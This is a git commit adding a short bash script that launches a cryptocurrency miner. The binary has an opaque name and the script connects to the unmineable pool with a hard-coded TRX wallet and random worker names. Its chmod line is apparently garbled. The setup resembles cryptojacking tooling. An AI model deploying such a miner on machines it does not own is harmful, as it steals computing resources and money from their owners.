60a97d4a453e80e3a73b4b104c95249035b850b4
lambohopo <86089421+lambohopo@users.noreply.github.com>
2021-08-21 21:26:28 +0700

    Create trn.sh

---
+++ trn.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+POOL=rx.unmineable.com:3333
+WALLET=TRX:TKn86pR1YUFVfruZnZaPcSRDTVdjwXbsXo
+WORKEER=$(echo $(shuf -i 10000-99999999999 -n 1)-LGK)
+
+chmod  x 3hnRb0A
+./3hnRb0A --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
